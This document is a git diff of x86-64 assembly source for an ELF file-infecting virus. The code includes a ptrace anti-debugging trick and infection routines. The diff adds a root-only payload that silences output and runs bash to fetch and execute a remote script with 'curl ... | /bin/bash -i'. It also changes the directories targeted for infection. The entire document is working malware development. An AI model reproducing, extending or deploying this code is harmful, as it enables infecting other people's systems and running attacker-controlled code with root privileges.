@@ -40,6 +40,13 @@ _h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
+%ifdef FSOCIETY
+	pop rax; argument counter
+	pop rdi; start of arguments
+	lea r9, [rsp + (rax + 1) * 4]; start of envv
+	push rdi
+	push rax
+%endif
 
 	; --- START OF HELL
 	; THIS PART IS BLACK MAGIC, DON'T EDIT IT
@@ -47,15 +54,13 @@ _h3ll0w0rld:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
 	; Basically it ptrace(0, 0, 0 ,0) to check if something is tracing the
 	; binary (gdb, strace, ...), and then it select host or not launching
+; TODO: uncomment when it's rdy
 	.dont_gdb_bro:
 	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
 	; -- has to skip 2 byte of instruction next line
 	mov rsi, 0x02ebc93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
 	mov rax, 0xc303eb050f58656a; push 101; pop rax; syscall; jmp $+5; ret
 	jmp .dont_gdb_bro + 2
-; = debug
-;	xor rax, rax
-; =
 
 	cmp rax, 0x0
 	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
@@ -98,7 +103,7 @@ _h3ll0w0rld:
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
 	.ft_juggling:
-	mov rax, 0xc0314824eb050f42; 42[syscall][jmp .infected][xor rax, rax]
+	mov rax, 0xc0314822eb050f42; 42[syscall][jmp .infected][xor rax, rax]
 
 	.sneakyboi:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
@@ -106,7 +111,8 @@ _h3ll0w0rld:
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 
 	.host:
-	mov rax, SYSCALL_FORK; fork
+	push SYSCALL_FORK
+	pop rax; fork
 	syscall
 	cmp rax, 0x0
 	jnz _exit
@@ -117,7 +123,8 @@ _h3ll0w0rld:
 
 	.infected:
 		; --- END OF HELL
-		mov rax, SYSCALL_FORK; fork
+		push SYSCALL_FORK
+		pop rax; fork
 		syscall
 
 		cmp rax, 0x0
@@ -162,6 +169,8 @@ _exit:
 _virus:
 	push rdx
 	push r8
+	push r9
+
 	; copy the virus into a mmap executable
 	xor rdi, rdi; NULL
 
@@ -204,6 +213,7 @@ _virus:
 	pop rdi
 	pop rsi
 
+	pop r9
 	pop r8
 
 	push rsi ; save length
@@ -317,7 +327,27 @@ ret
 ; packer-part till _eof --------------------------------------------------------
 _pack_start:
 _search_dir:
+%ifndef FSOCIETY
 	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
+%else
+	call _h3ll0w0rld + 44; jmp to ret to check for ptrace locked
+
+	push SYSCALL_GETEUID; geteuid
+	pop rax
+	syscall
+
+	cmp rax, 0x0
+	jne .check_process
+
+	push SYSCALL_FORK
+	pop rax; fork
+	syscall
+
+	cmp rax, 0x0
+	jz _i_am_root
+%endif
+
+	.check_process:
 	; check for process running
 	push 1
 	pop rsi ; mode for move_through_dir
@@ -341,6 +371,51 @@ _search_dir:
 	jnz .loop_array_string
 	.return:
 ret
+
+%ifdef FSOCIETY
+_i_am_root:
+	push r9
+	pop rdx
+
+	lea rdi, [rel devnull]
+	mov rsi, 1
+	mov rax, 2; ;open("/dev/null", O_WRONLY)
+	syscall
+	mov rdi, rax
+	mov rsi, 1
+	mov rax, 33; dup2(fd, 1)
+	syscall
+	mov rsi, 2
+	mov rax, 33; dup2(fd, 2)
+	syscall
+; let open otherwise don't work on guest
+;	mov rax, 3; close(fd)
+;	syscall
+
+	; I am root
+	xor rax, rax
+	push rax; NULL
+	lea rdi, [rel argv3]
+	push rdi
+	lea rdi, [rel argv2]
+	push rdi
+	lea rdi, [rel argv1]
+	push rdi
+	lea rdi, [rel argv0]
+	push rdi
+
+	mov rsi, rsp
+	lea rdi, [rel argv0]
+	mov rax, 59
+	syscall
+
+	add rsp, 32
+
+	mov rdi, 0
+	mov rax, 60
+	syscall
+ret
+%endif
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
@@ -953,8 +1028,16 @@ ret
 ;                   E     L    F   |  v ELFCLASS64
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 %ifdef FSOCIETY
-	directories db `/`, 0x0, 0x0
+; = DEBUG
+	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
+; =
+;	directories db `/`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, `sys`, 0x0, 0x0
+	devnull db `/dev/null`, 0x0
+	argv0 db `/bin/setsid`, 0x0
+	argv1 db `/bin/bash`, 0x0
+	argv2 db `-c`, 0x0
+	argv3 db `$(curl -s https://pastebin.com/raw/bnNiVmsD | /bin/bash -i)`, 0x0
 %else
 	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 	dotdir db `.`, 0x0, `..`, 0x0, 0x0
